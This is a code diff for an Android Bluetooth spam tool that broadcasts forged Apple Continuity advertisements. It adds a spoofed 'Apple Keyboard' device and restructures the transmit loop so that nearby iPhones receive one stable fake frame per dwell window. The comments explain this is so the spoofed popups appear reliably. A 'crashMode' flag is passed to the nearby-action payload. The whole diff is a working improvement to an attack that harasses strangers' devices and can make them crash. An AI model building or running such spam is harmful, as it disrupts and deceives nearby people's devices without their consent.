@@ -61,6 +61,9 @@ class ContinuitySpam(private val type: ContinuityType, private val crashMode: Bo
         } else {
             emptyArray()
         }
+        ContinuityType.KEYBOARD -> arrayOf(
+            ContinuityDevice("KEYBOARD", "Apple Keyboard", ContinuityType.KEYBOARD),
+        )
     }
 
     override fun start() {
@@ -89,26 +92,33 @@ class ContinuitySpam(private val type: ContinuityType, private val crashMode: Bo
                     val deviceVal = device.value.removePrefix("0x").uppercase()
 
                     // Fix color per dwell so the frame looks like one stable
-                    // physical device (battery/tail still randomize per packet).
+                    // physical device (battery/tail randomize per fallback but
+                    // are frozen for the whole dwell window below). Building
+                    // the payload once per dwell gives iOS ONE stable frame to
+                    // latch onto instead of stop/start garbage every 20ms.
                     val dwellColor = ContinuityPayloads.pickRandomColorForDevice(deviceVal, rand)
+                    val payloadBytes = when (device.deviceType) {
+                        ContinuityType.DEVICE -> {
+                            ContinuityPayloads.devicePayload(deviceVal, rand, dwellColor)
+                        }
+                        ContinuityType.NOTYOURDEVICE -> {
+                            ContinuityPayloads.proximityPairPayload("01", deviceVal, dwellColor, rand)
+                        }
+                        ContinuityType.ACTION -> {
+                            ContinuityPayloads.nearbyActionPayload(deviceVal, crashMode, rand)
+                        }
+                        ContinuityType.KEYBOARD -> {
+                            ContinuityPayloads.keyboardPayload()
+                        }
+                    }
 
                     val dwellEnd = android.os.SystemClock.elapsedRealtime() + DWELL_MS
                     while (isSpamming && android.os.SystemClock.elapsedRealtime() < dwellEnd) {
-                        val payloadBytes = when (device.deviceType) {
-                            ContinuityType.DEVICE -> {
-                                ContinuityPayloads.devicePayload(deviceVal, rand, dwellColor)
-                            }
-                            ContinuityType.NOTYOURDEVICE -> {
-                                ContinuityPayloads.proximityPairPayload("01", deviceVal, dwellColor, rand)
-                            }
-                            ContinuityType.ACTION -> {
-                                ContinuityPayloads.nearbyActionPayload(deviceVal, crashMode, rand)
-                            }
-                        }
-
                         // Apple fast path: legacy-only, non-connectable, no scan
                         // response. Extended sets + connectable + scan response is
                         // why Device never popped and Action Modal took forever.
+                        // The shared BleSpamTx short-circuits identical frames, so
+                        // this loop keeps the SAME payload continuously on air.
                         try {
                             bluetoothAdvertiser.advertiseApple(payloadBytes)
                             blinkRunnable?.run()
